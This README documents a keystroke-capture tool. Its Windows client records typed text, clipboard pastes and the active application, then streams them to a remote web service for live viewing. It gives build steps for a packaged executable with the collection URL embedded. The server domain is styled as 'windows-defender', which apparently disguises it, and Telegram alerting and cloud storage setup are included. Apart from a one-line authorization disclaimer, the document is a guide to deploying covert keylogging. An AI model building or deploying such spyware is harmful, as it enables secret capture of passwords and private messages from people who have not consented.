# Live Key Feed

Live Key Feed is a Python web service and desktop client. The client collects typed text, groups it into messages, and sends each message to the web service. The web page displays messages live and shows the device number that sent each one.

Only run the client on computers and accounts you own or are explicitly authorized to monitor.

## How It Works

```text
Keyboard input -> P3TROKL.exe -> POST /api/messages -> app.py -> index.html
```

Each message contains `text`, `device_id`, `device_name`, and `is_pasted`. The desktop client also records the active app and focused Windows control, keeping that destination while typing and starting a new message when focus moves to another field or app. The device number is a stable 12-character value generated from the computer name. The old separate heartbeat process is no longer used. A message is sent when Enter is pressed or after about 2.5 seconds without typing. Clipboard pastes are sent as separate messages and shown with a `Pasted` label and a different bubble color.

## Files

- `app.py`: FastAPI web server and message API.
- `client.py`: keyboard listener and message sender.
- `index.html`: live browser feed.
- `mobile_keyboard/`: native Android and iPhone sample keyboard clients.
- `P3TROKL.spec`: PyInstaller configuration.
- `render.yaml`: Render deployment configuration.
- `text.txt`: local message log, ignored by Git.

## Run Locally

Install dependencies:

```powershell
python -m pip install -r requirements.txt
```

Start the website:

```powershell
python app.py
```

Open `http://127.0.0.1:8000`, then start the client in another PowerShell window:

```powershell
python client.py
```

Type a message and press Enter. It should appear in the browser.

## Deploy to Render

1. Push the project to GitHub. `text.txt` is ignored by `.gitignore`.
2. Create a Render Web Service from the repository.
3. Render uses `render.yaml` with these commands:
   - Build: `pip install -r requirements.txt`
   - Start: `gunicorn -k uvicorn.workers.UvicornWorker app:app --bind 0.0.0.0:$PORT`
4. Open the Render service URL in a browser.

Make sure the deployed service contains the latest `app.py` and `index.html`.

## Configure Telegram Uptime Notifications

Create a Telegram bot with BotFather, then send it a message from the chat where
you want uptime notifications. Retrieve that chat's numeric ID and add these
secret environment variables in Render:

```text
TELEGRAM_BOT_TOKEN=your-bot-token
TELEGRAM_CHAT_ID=your-chat-id
```

The service sends an online notification at startup and a heartbeat every 15
minutes. To change the interval, add `TELEGRAM_UPTIME_INTERVAL_SECONDS` with a
value of at least 60. Telegram notifications are optional and do not affect the
health endpoint or service startup if they fail.

For alerts when the service is completely unreachable, configure an external
uptime monitor to check `/health`; a stopped service cannot send its own Telegram
message.

## Configure Supabase Storage

Create a free Supabase project and run this in the Supabase SQL Editor:

```sql
create table public.messages (
   id bigint primary key,
   text text not null,
   device_id text not null default 'unknown',
   device_name text not null default 'Unknown device',
   app_name text not null default 'Unknown app',
   time bigint not null,
   is_pasted boolean not null default false,
   created_at timestamptz not null default now()
);

create index messages_time_idx on public.messages (time desc);
```

If the table already exists, add the new column once:

```sql
alter table public.messages
add column if not exists app_name text not null default 'Unknown app';

alter table public.messages
add column if not exists is_pasted boolean not null default false;
```

Copy the Supabase PostgreSQL connection string into Render as the secret environment variable:

```text
DATABASE_URL=your-supabase-connection-string
```

When `DATABASE_URL` is set, the server loads and saves messages in Supabase. Without it, local development uses `text.txt` as a fallback.

## Run the Packaged Client

Use the exact URL shown by Render:

```powershell
./dist/P3TROKL.exe
```

The Render URL is embedded in the executable, so no `.env` file or terminal variables are required.

## Build the Executable

```powershell
taskkill /F /IM P3TROKL.exe /T 2>$null
python -m PyInstaller --clean --noconfirm P3TROKL.spec
```

Output: `dist/P3TROKL.exe`

## Troubleshooting

If the website is live but empty, check the client URL:

```powershell
echo $env:KEY_FEED_URL
```

It must be `https://windows-defender-cf8n.onrender.com`. Also check `https://windows-defender-cf8n.onrender.com/health`; it should return JSON containing `"ok": true`. Restart the client, type a message, and press Enter.

The service keeps the latest 200 messages in memory. Configure Supabase as described above so messages survive Render restarts and redeploys. `text.txt` is only the local fallback and is ignored by Git.

## API Endpoints

- `GET /`: web feed.
- `GET /messages`: stored messages.
- `GET /events`: live Server-Sent Events stream.
- `POST /api/messages`: accepts `text`, `device_id`, `device_name`, `app_name`, and `is_pasted`.
- `GET /api/devices`: devices that have sent messages.
- `GET /health`: service status and message count.